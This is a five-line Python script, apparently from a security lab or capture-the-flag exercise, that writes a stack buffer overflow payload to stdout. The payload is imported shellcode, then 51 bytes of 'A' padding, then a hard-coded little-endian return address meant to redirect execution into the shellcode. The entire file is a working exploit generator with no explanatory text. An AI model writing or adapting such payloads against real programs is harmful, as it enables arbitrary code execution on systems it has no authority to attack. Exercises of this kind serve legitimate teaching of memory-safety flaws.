import sys
from shellcode import shellcode
	
addr = 0xFFF6B9A4.to_bytes(4, "little")
sys.stdout.buffer.write(shellcode + b"A" * 51 + addr)
